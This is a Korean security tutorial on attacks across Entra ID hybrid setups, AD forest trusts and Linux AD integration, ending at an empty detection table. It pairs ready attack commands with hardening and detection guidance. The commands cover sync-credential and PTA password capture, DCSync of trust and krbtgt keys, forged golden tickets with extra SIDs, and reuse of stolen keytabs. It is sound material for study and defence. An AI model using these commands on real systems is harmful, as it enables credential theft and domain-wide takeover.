---
title: "AD 심화 — 하이브리드와 트러스트(Entra ID·포레스트·Linux 통합)"
description: "Entra Connect·PHS/PTA·AZUREADSSOACC$ Silver Ticket, 자식→부모 SID History·krbtgt inter-realm Golden Ticket, SSSD/Realmd keytab·Samba AD까지 하이브리드와 트러스트 공격을 조건·명령·하드닝·탐지로 정리합니다."
tags:
  - ActiveDirectory
  - EntraID
  - AzureAD
  - Trust
  - Forest
  - Linux
  - SSSD
  - Samba
  - OSCP
---

> [!warning] 허가된 환경에서만 실습하세요
> Entra Connect(구 Azure AD Connect) 서버, 포레스트 트러스트 키, Linux keytab는
> **도메인 혹은 포레스트 전체의 권한을 손에 쥘 수 있는 자산**입니다. 아래 기법 중
> 상당수는 실행과 동시에 **온프레미스와 클라우드 테넌트 모두**에 영향을 주고,
> SID History/Extra SIDs는 **사후 추적이 어려운 상태**로 남기 쉽습니다. 랩이 아닌
> 환경에서는 **"무엇을 바꿨는지 · 언제 되돌릴 것인지 · 누가 롤백하는지"**를 교전
> 시작 전 합의하고, 바꾼 모든 ACE·속성·발급 티켓·주입 SID·생성 Entra 객체를 보고서에
> 적으세요. Entra 테넌트 공격은 **MS 사용자 데이터**에 영향을 주는 경우가 많으므로
> 레드팀 범위에 **Entra 명시 허가**가 없다면 수행 금지입니다.

> [!summary] ⏱️ 5초 핵심 요약
> - **한 줄 비유**: 하이브리드 AD는 **"온프레미스 성과 클라우드 성 사이에 세워진
>   다리들의 집합"**입니다. Entra Connect 서버는 그 다리의 **중앙 기둥**이고, 포레스트
>   트러스트의 krbtgt inter-realm 키는 **다리 아래 통로의 비밀 열쇠**이며, Linux
>   keytab는 **문지기 집무실에 보관된 복제 열쇠**입니다. 하나만 흔들려도 양쪽
>   성이 열립니다.
> - **핵심 원리**: ① **Entra Connect**는 두 동기화 계정(**MSOL_\* AD DS Connector
>   계정 = PHS 사용 시 복제 권한 보유**, **Sync_\* 또는 On-Premises Directory Synchronization
>   Account = 클라우드 쓰기 권한**)을 보유해 **단일 호스트가 양쪽 전역 권한을 쥔
>   Tier-0**입니다. ② **Seamless SSO**는 도메인에 `AZUREADSSOACC$` 컴퓨터 계정을
>   만들고 그 NT 해시가 **테넌트 전체를 위한 Kerberos 서비스 키**가 됩니다. ③ 자식
>   도메인에서 부모·포레스트 전역으로 가는 전형은 **`krbtgt` inter-realm 키 추출 →
>   Golden Ticket + SID History(519 Enterprise Admins)**입니다. ④ Linux + AD는
>   **SSSD/Realmd → `/etc/krb5.keytab`**에 머신 계정 해시를 보관해 **파일 하나로
>   머신 전체 ID**가 결정됩니다.
> - **놓치기 쉬운 곳**: ① **Password Hash Sync(PHS)는 평문이나 NT 해시를 그대로
>   클라우드에 보내지 않지만**, PHS용 AD DS Connector에는 복제 권한이 필요하므로
>   그 계정 탈취가 온프레미스 DCSync로 이어지는 것이 핵심 위험입니다.
>   ② **Pass-through Authentication(PTA) 에이전트**는 **온프레→클라우드 방향의
>   패스워드 검증**을 하므로, 에이전트 호스트 침해 시 **평문 패스워드 가로채기** 가능
>   (Shawn Jones/CyberArk 연구). ③ **AZUREADSSOACC$의 비밀번호는 기본으로 자동
>   로테이션되지 않으며 Microsoft는 30일 주기 롤오버를 권고**합니다.
>   ④ 포레스트 트러스트는 **"SID 필터링이 디폴트 켜져 있다고 믿는 조직"**이 많지만
>   **양방향 Parent↔Child intra-forest 트러스트는 SID 필터링이 디폴트 꺼져 있음**.
>   ⑤ SSSD keytab의 기본 모드는 `640`이지만 **애플리케이션이 더 넓게 풀어 두는 경우**
>   가 흔함.
> - **근본 조치**: **Entra Connect 서버 Tier-0 분리 + AZUREADSSOACC$ 비밀번호 주기
>   로테이션 + 포레스트 트러스트 SID 필터링 활성 + krbtgt 2회 리셋 자동화 + Linux
>   keytab 접근 통제(0600) + 하이브리드 조건부 접근(Conditional Access) + 디바이스
>   준수성 강제 + Entra ID Protection으로 위험 로그인 자동 차단**.

[[AD 심화 — ACL 권한 체인과 DCSync 완성|ACL·DCSync]], [[AD 심화 — Kerberos
티켓 위조와 위임 공격 완성|Kerberos 티켓·위임]], [[AD 심화 — AD CS 인증서
공격 전수 정리|AD CS 공격]], [[AD 심화 — 강제 인증과 릴레이의 이해와 방어|강제
인증·릴레이]], [[AD 심화 — 내부 서버 공격(SCCM·MSSQL·WSUS·Exchange)|내부 서버
공격]]이 **단일 포레스트 내부**의 공격 체인을 다뤘다면, 이 글은 **포레스트
경계와 클라우드·Linux 경계**를 넘나드는 공격을 정리합니다. 기초 트러스트 개념은
[[공격 체인 이전의 AD 아키텍처 기초 — Kerberos, NTLM, DACL·ACE, GPO·SYSVOL, 도메인 트러스트|AD 아키텍처 기초]]
를 참조하세요.

모든 명령은 플레이스홀더(`<child>`, `<parent>`, `<tenant>`, `<domain>`)로
일반화했고 예시 도메인은 온프레 `corp.local`(부모) / `dev.corp.local`(자식),
Entra 테넌트는 `example.onmicrosoft.com`, IP는 `10.0.0.0/24` 사설입니다. **이
PC에서는 포레스트 랩·Entra 테넌트·SSSD 통합 머신을 돌릴 수 없어 도구 옵션·문법은
공식 README·Microsoft Learn·연구 논문 기준이며 실행 결과 자체는 미검증**입니다.
각 도구의 실제 옵션은 `-h` 또는 저장소 README로 재확인하세요. 재현은 §7 "실습
환경"의 공개 랩에서 수행합니다.

---

## 한눈에 보는 하이브리드·트러스트 공격 요약표

| 공격 축 | 대표 기법 | 필요 조건 | 얻는 것 | 끊어야 할 방어 지점 |
|---|---|---|---|---|
| **Entra Connect** | 서버 로컬 관리자 → MSOL 해시 추출 | Sync 호스트 로컬 관리자 | 온프레 DCSync | Entra Connect 서버 Tier-0 |
| **Seamless SSO** | `AZUREADSSOACC$` NT 해시 → Silver Ticket (Azure) | 온프레 DCSync | 테넌트 전역 사용자 가장 | 비밀번호 로테이션, Seamless SSO 재검토 |
| **PTA** | PTA 에이전트 호스트 침해 | 에이전트 서버 로컬 관리자 | 사용자 평문 패스워드 가로채기 | 에이전트 호스트 Tier-0, EDR |
| **PHS 역설** | AD DS Connector 탈취 → DCSync | PHS용 MSOL 계정 자격증명 | 온프레 사용자 NT 해시 전수 | Connector 최소 권한, MFA |
| **포레스트 자식→부모** | `krbtgt` inter-realm 키 추출 + SID History | 자식 도메인 Enterprise Admin 급 | 부모/포레스트 전역 Golden Ticket | SID 필터링(SIDHistory 비허용) |
| **외부 트러스트** | 상대 도메인에서의 SID 주입 | 트러스트 양방향 + SID 필터링 꺼짐 | 상대 도메인 특권 ACL 사용 | SID 필터링 ON, Quarantined trust |
| **SID History 삽입** | DSInternals·mimikatz lsadump::dcsync→lsadump::lsa | 두 도메인 DC 접근 | 부모 쪽 519/512 멤버 유사 권한 | AdminSDHolder 감사, SIDHistory 사용 제한 |
| **Linux + AD** | `/etc/krb5.keytab` 추출 | Linux 호스트 로컬 루트 | 머신 계정 해시 → Silver Ticket | `chmod 600`, `chattr +i` |
| **Samba AD** | `--rid-base` 충돌, Samba DRS 복제권 | Samba AD 멤버 관리자 | 보안 데이터베이스 복제 | Samba 4 최신 유지 |
| **Entra 공격 정찰** | ROADrecon/AADInternals 열거 | 유효 Entra 사용자 토큰 | 테넌트 사용자·앱·역할·조건부 접근 매핑 | Entra 로그 + 비정상 토큰 알림 |

> [!important] "클라우드가 생기면 온프레 공격은 덜 중요하다"는 오해
> 하이브리드 환경의 **공격 비용 구조는 반대**입니다. 온프레 DC를 쥐면 **Entra 쪽으로
> 자동 전파되는 신뢰(동기화·SSO·연합)**가 존재하며, Entra Connect 서버가 뚫리면
> **온프레의 DCSync와 Entra 테넌트 쓰기**를 동시에 잃습니다. "클라우드 성과 온프레
> 성은 서로를 백업한다"가 아니라 **"서로의 공격 표면이 된다"**가 맞는 관점입니다.

---

## 1. Entra ID 하이브리드 — Entra Connect가 Tier-0인 이유

### 1.1 Entra Connect 서버의 두 가지 자격증명

Entra Connect(기존 Azure AD Connect; 2023년 말부터 Microsoft Entra Connect Sync로
명명 변경)는 설치되면 두 종류의 특권 계정을 만듭니다.

| 계정 | 저장 위치 | 가진 권한 |
|---|---|---|
| **MSOL_\<random\>** (AD DS Connector 계정) | Entra Connect DB에 암호화 저장 | **PHS 사용 시** `Replicate Directory Changes`·`... All`; 그 외 기능별 최소 권한 |
| **Sync_\<hostname\>_\<random\>** (Entra 테넌트의 Directory Synchronization Accounts) | Entra 테넌트 | **Directory Synchronization Accounts** 역할 — 디렉터리 쓰기 |
| **Entra Connector 설치/서비스 계정** | 로컬 서비스 LSA | Sync 엔진 실행 |

일부 비공식 글이 이 계정군을 `DSSyncOps`/`DSyncOps`처럼 부르지만, Microsoft 공식
명칭은 **AD DS Connector account**, **ADSync service account**, **Microsoft Entra
Connector account**입니다. 이 글에서는 검증 가능한 공식 명칭과 `MSOL_`·`Sync_`
접두사만 사용합니다.

**결론**: PHS가 켜진 전형적 설치에서 Entra Connect 서버는 단일 호스트로 **온프레
DCSync + 클라우드 동기화 쓰기**를 쥡니다. PHS를 쓰지 않는 설치는 MSOL 계정의 실제
ACL을 확인해야 하며, 불필요한 복제 권한은 제거합니다. Microsoft 공식 가이드도 이
서버를 **Tier-0 자산**으로 분류합니다
([Microsoft Learn — Microsoft Entra Connect Sync: 사용되는 계정 및 권한](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)).

### 1.2 MSOL 해시 추출

Entra Connect 서버에서 로컬 관리자를 얻으면 LocalDB(기본 `Microsoft::ADSync::ADSyncServer`)
에 **DPAPI로 암호화된 MSOL 평문 자격증명**을 복호화할 수 있습니다. 공개 도구:

| 도구 | 역할 | 저장소 |
|---|---|---|
| **AADInternals** `Get-AADIntSyncCredentials` | Entra Connect LocalDB에서 MSOL + Sync_ 계정 자격증명 복호화 | <https://github.com/Gerenios/AADInternals> |
| **ADSyncDecrypt** (Fox-IT) | 동일 목적의 독립 구현 | <https://github.com/fox-it/adconnectdump> |
| **adconnectdump** | 서비스 호스트에서 자격증명 덤프 | 상동 |

```powershell
# AADInternals: Entra Connect 서버 로컬 관리자에서 실행
Install-Module AADInternals
Import-Module AADInternals
Get-AADIntSyncCredentials
```

평문 MSOL 계정이 나오면 **그 계정에 PHS 복제 권한이 실제로 있는 경우**
`impacket-secretsdump`로 DC에 붙어 DCSync가 가능합니다. Express/PHS 설치에서 흔한
경로지만 모든 Entra Connect 배포에 무조건 적용되는 권한은 아닙니다. 먼저 AD ACL과
현재 동기화 기능을 확인합니다.

### 1.3 PHS vs PTA vs Federation — 공격 접점

| 인증 모드 | 작동 | 공격 접점 |
|---|---|---|
| **Password Hash Sync (PHS)** | 온프레 NTHash를 **다시 해시(PBKDF2)**해 Entra에 저장 | 온프레 DCSync → **온프레 NTHash 재사용 공격**은 가능하지만 Entra 로그인은 PBKDF2 후처리라 재사용 불가; 그러나 **평문 크랙**이 나오면 Entra에도 재사용 가능 |
| **Pass-through Authentication (PTA)** | Entra 요청을 PTA 에이전트가 **온프레 DC에 검증 요청** | PTA 에이전트 호스트 로컬 관리자 → **모든 사용자 평문 패스워드 가로채기**(Xpn/CyberArk 연구) |
| **Federation (ADFS)** | ADFS 서버가 SAML 토큰 발급 | ADFS 토큰 서명 키 탈취 → **Golden SAML**([CyberArk 연구](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)) |

**PTA 에이전트 공격**: `AADInternals`의 `Install-AADIntPTASpy`는 로컬 관리자 권한으로
PTA 에이전트 프로세스에 DLL을 로드해 **인증 요청 평문을 로깅**합니다. 공식 설명:
<https://aadinternals.com/aadinternals/#install-aadintptaspy>.

```powershell
# 에이전트 호스트 로컬 관리자에서 (허가된 랩에서만)
Install-AADIntPTASpy
# 이후 모든 PTA 인증 요청의 사용자명·패스워드가 %ProgramData%\AADInternals\PTASpy.csv에 로깅
```

### 1.4 Seamless SSO — `AZUREADSSOACC$` Silver Ticket

Seamless SSO가 활성화되면 **온프레 AD에 `AZUREADSSOACC$` 컴퓨터 계정**이 만들어지고,
이 계정의 **NT 해시가 Kerberos 토큰 서명 키**로 사용됩니다. 도메인 어드민 또는
DCSync 권한으로 이 해시를 추출하면 **임의 사용자 이름으로 Entra에 유효한 Kerberos
토큰**을 발급할 수 있습니다.

```bash
# NT 해시 추출 (DC 접근 필요)
impacket-secretsdump -just-dc-user 'AZUREADSSOACC$' corp.local/<user>:'<pw>'@<dc>

# AADInternals로 임의 사용자용 Silver Ticket 발급 (예: alice@example.onmicrosoft.com)
Open-AADIntOffice365Portal -Hash <NTLM_HASH> -UserName alice@example.onmicrosoft.com
```

- 중요한 점 — **이 계정의 비밀번호는 자동 로테이션되지 않습니다**. Microsoft의
  [Seamless SSO — 자주 묻는 질문](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-faq)
  은 PowerShell로 **30일마다** Kerberos 복호화 키를 롤오버하도록 권장합니다.

### 1.5 Device Code Phishing (원리만)

**Device Code Flow**는 OAuth 2.0의 보조 흐름으로, 공용 단말에서 사용자가 코드
한 조각(`ABC123XY`)을 받아 다른 디바이스의 브라우저에 입력해 로그인하게 합니다.
공격자가 이 코드를 피싱 메일/채팅으로 유도하면 **사용자 토큰(Access + Refresh)**
을 발급받습니다. 재현 금지(운영 사용자 피싱) — 원리와 방어만 다룹니다.

**방어**: [Conditional Access](https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview) 로 **"Device Code Flow를 차단"** + **디바이스 준수성** + **MFA 강제**.

### 1.6 Entra 공격 정찰 도구

| 도구 | 쓰임 | 저장소 |
|---|---|---|
| **AADInternals** | 자격증명 추출·토큰 조작·Entra 테넌트 공격 전반 | <https://github.com/Gerenios/AADInternals> |
| **ROADtools (ROADrecon, ROADtx)** | Entra 테넌트 그래프 열거·오프라인 분석 | <https://github.com/dirkjanm/ROADtools> |
| **GraphRunner** | MS Graph 중심 레드팀 자동화 | <https://github.com/dafthack/GraphRunner> |
| **MicroBurst** | Azure/Entra 통합 공격 모듈 | <https://github.com/NetSPI/MicroBurst> |

```bash
# ROADrecon 기본 열거
roadrecon auth -u user@example.onmicrosoft.com -p '<pw>'
roadrecon gather
roadrecon gui    # 로컬 Flask UI
```

### 1.7 하드닝

| 영역 | 조치 |
|---|---|
| Entra Connect 서버 | **Tier-0**. PAW에서만 관리, 로컬 관리자 분리, EDR 상시, 디스크 암호화 |
| MSOL/Sync 계정 | 비밀번호 주기 로테이션, 해당 비밀번호를 소유하는 Local Admin 리스트 축소 |
| Seamless SSO | 운영 환경에서 필요 없으면 **비활성**, 쓰면 **`AZUREADSSOACC$` 30일 로테이션** |
| PTA 에이전트 | Tier-0 호스트, 다른 역할 공존 금지, EDR, 관리 PAW 전용 |
| 조건부 접근 | **MFA 상시 강제**, 디바이스 준수성, 지역 제한, 위험 로그인 차단 |
| 로그 | Entra Sign-in 로그 + Audit 로그 → SIEM 전송, Entra ID Protection 활성 |

### 1.8 탐지

| 신호 | 로그 | 패턴 |
|---|---|---|
| 비정상 MSOL 사용 | 온프레 Security 4662, DC Audit | MSOL 계정이 **콘솔 로그인**하거나 DC가 아닌 호스트에서 **DRSUAPI** 호출 |
| AZUREADSSOACC$ 티켓 | 온프레 4769 | **티켓 암호화 유형 불일치**(RC4), 비정상 클라이언트 IP |
| Device Code Flow | Entra Sign-in | `AuthenticationMethod=deviceCode`, 비정상 IP/시간 |
| 위험 로그인 | Entra ID Protection risk detections | 익명 IP·낯선 로그인 속성·비정상 토큰, CA 차단 결과 |
| ROADrecon 수집 | Entra Sign-in + Audit | Graph `directoryObjects` 대량 조회 |
| PTA 에이전트 조작 | Windows Security 4688, Sysmon | `AzureADConnectAuthenticationAgentService.exe`에 DLL 로드/Install-AADIntPTASpy 호출 |
| 하이브리드 신뢰 변경 | Entra Audit | Cross-tenant access·Federation·도메인 인증 설정 변경, Directory Synchronization Accounts 활동 |

### 1.9 출처(Entra ID 하이브리드)

- Microsoft Learn — [Microsoft Entra Connect Sync: 계정과 권한](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions), [Seamless SSO FAQ](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-faq), [Hybrid Identity Design](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/plan-hybrid-identity-design-considerations-overview)
- Nestori Syynimaa — [AADInternals](https://github.com/Gerenios/AADInternals), [aadinternals.com](https://aadinternals.com)
- dirkjanm — [ROADtools](https://github.com/dirkjanm/ROADtools), [블로그: Entra ID attacks](https://dirkjanm.io/)
- CyberArk Labs — [Golden SAML 연구](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps), [PTA 가로채기 연구](https://www.cyberark.com/resources/threat-research-blog/azure-active-directory-pass-through-authentication-flaws)
- dafthack — [GraphRunner](https://github.com/dafthack/GraphRunner)
- Fox-IT — [adconnectdump](https://github.com/fox-it/adconnectdump)

---

## 2. 포레스트 트러스트 — 자식 도메인에서 엔터프라이즈까지

### 2.1 트러스트 방향과 "공격 가능성" 표

| 트러스트 타입 | 방향 | SID 필터링 기본 | 공격 성립 조건 |
|---|---|---|---|
| **Parent↔Child (intra-forest)** | 양방향 | **꺼짐** (같은 포레스트 내 완전 신뢰) | 자식에서 부모로 — SID History/Extra SID 사용 가능 |
| **Tree-root (intra-forest)** | 양방향 | 꺼짐 | 상동 |
| **External trust** | 단방향 또는 양방향 | **켜짐** | 특정 환경에서 `/sidhistory` 비활성 필요 |
| **Forest trust** | 단방향 또는 양방향 | 켜짐 (SID 필터링 + 선택적 쿼런틴) | **"Enable SID History"** 수동 활성 사례 있음 |
| **Shortcut trust** | 양방향 | 꺼짐(intra-forest) | 상동 |
| **Realm trust (MIT KDC)** | 양방향 | — | 리얼름 간 krbtgt 키 공유 |

- Microsoft 공식: [Security considerations for trusts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/security-considerations-for-trusts).

### 2.2 자식→부모 전통 루트: krbtgt inter-realm 키

자식 도메인 Enterprise Admins가 아니어도, 자식 도메인의 DCSync 권한만 있으면
**부모와의 inter-realm 키 쌍(`krbtgt` + 트러스트 키)**을 뽑을 수 있습니다. 그 키로
**부모 도메인 TGS**를 임의로 발급하거나(Silver Ticket 기법의 상호 트러스트 변형)
SID History가 담긴 **Golden Ticket**을 만들어 부모 도메인에서 Enterprise Admins
멤버인 양 행동할 수 있습니다.

```bash
# 자식 도메인의 krbtgt + 트러스트 키 뽑기 (DCSync 필요)
impacket-secretsdump -just-dc-ntlm 'DEV\<user>':'<pw>'@<child-dc>
# 이 결과에서 `krbtgt` + `DEV$`의 해시 메모

# mimikatz로 TGT 위조 (부모 Enterprise Admins 유사 권한을 노림)
# 자식 도메인 SID = S-1-5-21-A1-A2-A3
# 부모 도메인 SID = S-1-5-21-B1-B2-B3
# Enterprise Admins RID = 519
mimikatz # kerberos::golden /domain:dev.corp.local \
          /sid:S-1-5-21-A1-A2-A3 \
          /sids:S-1-5-21-B1-B2-B3-519 \
          /rc4:<child_krbtgt_hash> \
          /user:Administrator /id:500 /groups:513 \
          /ptt
# 이후 부모 도메인 DC에서 DCSync 시도 (SID 필터링 꺼진 intra-forest 트러스트에서 성립)
impacket-secretsdump -no-pass -k 'corp.local/Administrator'@<parent-dc>
```

- 참조: [harmj0y — The Trustpocalypse](https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/), [adsecurity.org — Trust and Golden Tickets](https://adsecurity.org/?p=1588).
- **재현 전 반드시 확인**: 부모 도메인의 SID 필터링 상태(`netdom trust /quarantine`,
  `Get-ADTrust`). 꺼진 경우만 SID History 기법이 통합니다.

### 2.3 트러스트 키 추출 — `secretsdump`의 trust account

현재 Impacket `secretsdump`에는 **`--trust`라는 옵션이 없습니다**. 오래된 메모의
`secretsdump trust` 표현은 "DC의 NTDS/LSA에서 트러스트 계정 비밀을 덤프한다"는
뜻으로 읽어야 합니다. DCSync 권한이 있으면 상대 도메인 이름의 trust account
(`CORP$` 같은 객체)를 지정하거나 `-just-dc` 결과에서 해당 객체를 찾습니다.

```bash
# trust account만 DCSync (실제 이름은 Get-ADTrust/LDAP로 먼저 확인)
impacket-secretsdump -just-dc-user 'CORP$' \
  'dev.corp.local/<user>':'<pw>'@<child-dc>

# 또는 전체 DCSync 결과에서 `corp.local$`/`CORP$`의 NT 키 확인
impacket-secretsdump -just-dc \
  'dev.corp.local/<user>':'<pw>'@<child-dc>
```

Microsoft 공식 가이드: [Kerberos Trust Keys와 inter-realm 키](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-ds-trust-restore-overview).

### 2.4 Cross-forest Golden Ticket

Forest trust는 SID 필터링이 기본 활성이므로 **단순한 SID History 주입은 통하지
않지만**, **"Enable SIDHistory on Trust"** 옵션을 활성화해 둔 포레스트에서는
**Extra SID**를 넣은 티켓이 통과합니다. 공격자는 트러스트 양쪽의 krbtgt 또는
트러스트 키를 쥐고 **상대 포레스트의 Enterprise Admins SID**를 ExtraSID에 포함시킵니다.

```powershell
# SID 필터링 상태 확인 (양쪽 포레스트에서)
Get-ADTrust -Filter * | Select Name, TrustType, Direction, SIDFilteringQuarantined, SIDFilteringForestAware

# netdom
netdom trust corp.local /domain:partner.corp.local /Quarantine  # 현재 설정 조회
```

**복합 벡터**(ACL 글 §12 연계): 공격자가 **상대 포레스트 ACL**(Enterprise Admins,
Schema Admins 쓰기)을 얻으면 트러스트와 무관하게 상대 포레스트에서 ACE 체인을
개설할 수 있습니다.

### 2.5 공통 오류 표

| 메시지 | 원인 | 해결 |
|---|---|---|
| `KDC_ERR_WRONG_REALM` | 리얼름 간 티켓에 잘못된 realm 지정 | Golden Ticket의 `/domain`을 자식, SID만 부모로 유지 |
| `KRB_AP_ERR_MODIFIED` | 트러스트 키/krbtgt 해시 불일치 | 키 로테이션 발생 — 다시 덤프 필요 |
| `The trust relationship between this workstation and the primary domain failed` | 트러스트 계정 비밀번호 로테이션 | 재조인 또는 `netdom trust` 재구성 |
| `SeTokenPrivilege_LogonServer` 류 접근 거부 | SID 필터링 활성에서 Extra SIDs가 폐기됨 | 설정에 따라 공격 성립 불가 — 정상 동작 |

### 2.6 하드닝

| 영역 | 조치 |
|---|---|
| intra-forest | **보안 경계는 포레스트 전체**임을 수용 — Tier-0 계정과 자식 도메인 관리자 사이의 신뢰 경계를 강화(관리 전용 포레스트 Red Forest/ESAE) |
| forest trust | **SID 필터링 강제**(`netdom trust /EnableSidHistory:no`), 선택적 인증 적용(`/SelectiveAuth:yes`) |
| 트러스트 키 | 트러스트 **주기적 재생성** (관리 도구 또는 PowerShell `Reset-ADTrust`) |
| 감사 | `Set-ADDomain`·`Set-ADForest`·`netdom trust` 변경 감사, 신규 트러스트 생성 알림 |
| krbtgt | **2회 리셋**을 자동화(Microsoft [krbtgt reset script](https://aka.ms/krbtgt)), 자식·부모 모두 |

### 2.7 탐지

| 신호 | 로그 | 패턴 |
|---|---|---|
| 비정상 inter-realm TGS | 4769 | **다른 realm**이 발급한 TGT로 서비스 티켓 요청, 암호화 유형 RC4로 다운그레이드 |
| krbtgt 비밀번호 변경 | 4723/4724 | 운영 변경 창 외의 변경 |
| SID History 설정 | **4765/4766**, 4738/5136 | SID History 추가 성공/실패와 사용자 객체 `sIDHistory` 변경 |
| 신규/변경 트러스트 | 4706/4707/4716 | **New trusted domain/변경/제거**가 변경관리와 불일치 |

- 참고: [Microsoft Learn — AD DS 감사 범주](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings).

### 2.8 출처(포레스트 트러스트)

- Microsoft Learn — [Security considerations for trusts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/security-considerations-for-trusts), [AD DS Trust 복원](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-ds-trust-restore-overview), [krbtgt reset tool](https://github.com/microsoft/New-KrbtgtKeys.ps1)
- Will Schroeder & Lee Chagolla-Christensen — ["An ACE Up The Sleeve: Designing Active Directory DACL Backdoors"](https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-5c7fd3f7f38) (Black Hat 2017 백서)
- Sean Metcalf — [adsecurity.org 트러스트/Golden Ticket 시리즈](https://adsecurity.org/?p=1588)
- harmj0y — [Trustpocalypse 블로그](https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/)
- Benjamin Delpy — [mimikatz Wiki — kerberos::golden](https://github.com/gentilkiwi/mimikatz/wiki)
- Fortra — [Impacket secretsdump](https://github.com/fortra/impacket)

---

## 3. Linux + AD 통합 — keytab와 Samba AD

### 3.1 SSSD / Realmd 조인 흐름

Linux 호스트를 AD 도메인에 조인하는 전형 흐름은 `realmd` 또는 수동 `net ads join`을
사용해 **머신 계정**(`HOSTNAME$`)을 만들고, 그 머신 계정의 **AES256-CTS-HMAC-SHA1-96
키를 `/etc/krb5.keytab`**에 저장하는 것입니다. SSSD는 사용자 인증 시 이 키로
Kerberos 교환을 수행합니다.

```bash
# 조인 (RHEL/Rocky 등)
realm discover corp.local
realm join --user=<admin>@CORP.LOCAL corp.local

# keytab 확인
klist -kte /etc/krb5.keytab
```

`klist -kte` 결과에는 각 엔트리의 **KVNO**와 **암호화 유형**이 표시됩니다. 이
파일은 **머신 계정 패스워드와 등가**입니다.

### 3.2 keytab 추출 공격

| 조건 | 영향 |
|---|---|
| 호스트에 로컬 루트 획득 | `/etc/krb5.keytab`을 복사해 **그 머신 계정으로 TGT 요청**, 해당 계정 권한으로 접근 가능 |
| 애플리케이션 전용 keytab | Apache mod_auth_kerb, PostgreSQL GSSAPI 등 각 서비스별 keytab 파일 — 종종 `640` 이상으로 풀려 있음 |
| keytab 파일 보유 | `kinit -k -t ...`로 KDC에서 정상 TGT 요청; 키를 별도 추출했다면 `impacket-getTGT -aesKey` 사용 |

```bash
# 공격자 호스트에서 수집한 keytab로 KDC에 정상 TGT 요청
export KRB5CCNAME=/tmp/host.ccache
kinit -k -t ./krb5.keytab 'HOSTNAME$@CORP.LOCAL'

# 발급된 ccache를 사용해 "머신 계정에 원래 허용된" SMB 접근만 검증
impacket-smbclient -k -no-pass 'corp.local/HOSTNAME$'@filesrv.corp.local
```

**머신 계정 키가 유출됐다고 임의 사용자를 가장하거나 다른 서버의 모든 SPN을 쓸 수
있는 것은 아닙니다.** 기본 효과는 그 머신 계정으로 인증하는 것이며, 권한 상승은
RBCD·ACL·그룹 멤버십처럼 **별도 잘못된 권한**이 있을 때만 이어집니다. `host/`,
`cifs/`, `HTTP/` 등 해당 컴퓨터 계정에 연결된 SPN 목록은 LDAP로 확인합니다.

### 3.3 SMB 공유 통합 인증과 AD 가입 Linux의 자격증명 저장

- **`/var/lib/sss/db/`**: SSSD 캐시. `cache_credentials = true`이면 오프라인 인증용
  검증값이 저장됩니다. NT 해시처럼 그대로 재사용할 수 없고 버전·설정별 분석이
  필요하지만, 파일 유출 자체를 **자격증명 자료 유출**로 취급해야 합니다.
- **`/etc/sssd/sssd.conf`**: 조인 시 LDAP/AD 서버 정보 저장. 비밀번호는 저장하지
  않지만, 어떤 도메인과 결합돼 있는지, 어떤 OU에 있는지 등 정찰 가치가 있음.
- **Samba 공유 자격증명**: `smbclient -k` 또는 `mount -t cifs ... -o sec=krb5`를 쓰면
  keytab 기반 Kerberos가 적용됩니다. **ccache 공유 설정**(`KRB5CCNAME`)이 그룹 접근
  가능한 곳이면 **세션 티켓 도용**이 가능합니다.

### 3.4 Samba AD (POC/소규모 환경) 특이점

Samba 4는 AD DC 역할을 할 수 있습니다. 대개 테스트/소규모 환경에서 사용되며,
관리 특이점이 있습니다.

| 영역 | 주의 |
|---|---|
| 복제 프로토콜 | DRSUAPI 호환 — Impacket `secretsdump`로 **DCSync 가능** |
| SYSVOL | 표준 Windows 구현과 미세한 차이가 있어 GPO 호환에 주의 |
| 자격증명 저장 | `secrets.tdb`에 머신 계정 비밀 저장 — 경로 접근 통제 필수 |
| 버전 | 과거 CVE 다수(예: CVE-2020-1472 Zerologon은 Samba AD도 영향) → 최신 유지 |

- Samba 보안 공지: <https://www.samba.org/samba/history/security.html>.

### 3.5 공통 오류 표

| 메시지 | 원인 | 해결 |
|---|---|---|
| `Preauthentication failed while getting initial credentials` | 키 KVNO 불일치 또는 시간 차 >5분 | `chronyd` 동기화, `kinit -V`로 verbose |
| `KDC has no support for encryption type` | AES 비활성 도메인에 AES만 지원 요청 | `/etc/krb5.conf`에서 `permitted_enctypes` 조정 |
| `cifs_mount failed w/return code = -13` | ccache 접근 권한 미비 또는 SMB 서명 요구 | `klist`로 유효 티켓 확인, 커널 모듈 로드 상태 확인 |
| `net ads join` 실패 | 사전 DNS 미설정 | `/etc/resolv.conf`의 nameserver를 DC로 지정 |

### 3.6 하드닝

| 영역 | 조치 |
|---|---|
| keytab 접근 | `/etc/krb5.keytab` **`chmod 600 root:root`**, SELinux/AppArmor 격리 |
| 애플리케이션 keytab | 서비스 사용자 소유 + 600, chown 분리 |
| SSSD 캐시 | `cache_credentials = false` 또는 짧은 TTL, 캐시 디렉터리 `/var/lib/sss/db`를 `0700` 유지 |
| ccache | 공유 메모리 또는 파일 기반 ccache를 `KEYRING:persistent:%{uid}` 형식으로 — 세션별 분리 |
| 머신 계정 | AES 우선, RC4 비활성 여부를 도메인 호환성 검증 후 단계 적용 |
| 패치 | 특히 Samba AD는 최신 유지 — CVE 발행 빈도가 높음 |
| 로그 | `/var/log/sssd/`, `/var/log/krb5kdc.log`를 중앙 수집 |

### 3.7 탐지

| 신호 | 로그 | 패턴 |
|---|---|---|
